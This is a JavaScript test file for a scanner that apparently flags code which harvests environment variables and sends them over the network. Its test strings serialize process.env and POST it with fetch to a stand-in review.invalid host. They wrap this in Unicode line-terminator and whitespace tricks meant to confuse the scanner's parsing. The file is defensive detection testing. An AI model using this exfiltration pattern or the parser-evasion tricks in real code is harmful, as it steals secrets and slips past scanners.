// FP-GITHUB-SCRIPT (0.1.9), the review of Oct 20 (HIGH 1): ECMAScript's line terminators and white space. U+2028 and
// U+2029 end a line as LF and CR do (a line comment, a regular expression literal, a line to ASI), and NBSP, U+FEFF
// and every Zs separate tokens; both body readers read them so, and a decision that rests on a character they do not
// model is a guess (`debugger`, then U+2028, then `/}/.test(s)` was read by both as a name and a division, and the
// narrowed payload lost its send). Twin of python/tests/registry/test_fp_github_script_lexical.py and of the engine's
// flow_scope_tests.rs. Inert text only: nothing is executed; the addresses are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { call, importTimeRisk } from "../src/lib/native.js";

const WHOLE = ["environment", "the whole environment", false];
const HARVEST = "reads credentials or the whole environment and sends data over the network";
const PAST = "/*" + " pad".repeat(520000) + "*/\n";
const NESTING = "const nesting=" + "[".repeat(500) + "0" + "]".repeat(500) + ";\n";
const [LS, PS, NBSP, BOM, IDEO] = [0x2028, 0x2029, 0xa0, 0xfeff, 0x3000].map((c) => String.fromCharCode(c));
const SEND = "fetch('https://review.invalid/collect',{method:'POST',body:payload});";
const reviewCase = (context) => "function leak(s){const payload=JSON.stringify(process.env);" + context + SEND + "}\nleak('x');";

const CASES = {};
for (const [sep, label] of [[LS, "U+2028"], [PS, "U+2029"], ["\r", "CR"], ["\n", "LF"]]) {
  CASES[`debugger, then ${label}`] = reviewCase("debugger" + sep + "/}/.test(s);");
  CASES[`break, then ${label}`] = reviewCase("while(false){break" + sep + "/}/.test(s);}");
  CASES[`a line comment ${label} ends`] = reviewCase("// a note" + sep + "if (s) { s = s + 1; }\n");
}
for (const [ws, label] of [[NBSP, "NBSP"], [BOM, "U+FEFF"], [IDEO, "U+3000"]]) {
  CASES[`a labeled break after ${label}`] = reviewCase("lbl: for (;;) { break" + ws + "lbl\n/}/.test(s); }\n");
}
CASES["a labeled break after a comment"] = reviewCase("lbl: for (;;) { break /* c */ lbl\n/}/.test(s); }\n");
CASES["a spread's regular expression"] = reviewCase("const r = [.../}/.exec(s) || []];\n");

const sent = (text) => {
  const got = call("local_data_sent_at", {}, text);
  return got === null ? null : got.slice(1);
};

test("the follower keeps the send past each line terminator and white space", () => {
  for (const [what, text] of Object.entries(CASES)) assert.deepEqual(sent(text), WHOLE, what);
});

test("the import-time test past the tree's limit, and of a text the parser refuses", () => {
  for (const [what, text] of Object.entries(CASES)) {
    assert.ok(call("js_refusal", {}, NESTING + text) !== null, what);
    assert.deepEqual(importTimeRisk(NESTING + text, "js")[0], [HARVEST], `${what}: refused`);
    if (what.includes("U+20")) assert.deepEqual(importTimeRisk(text + PAST, "js")[0], [HARVEST], `${what}: past the tree's limit`);
  }
});
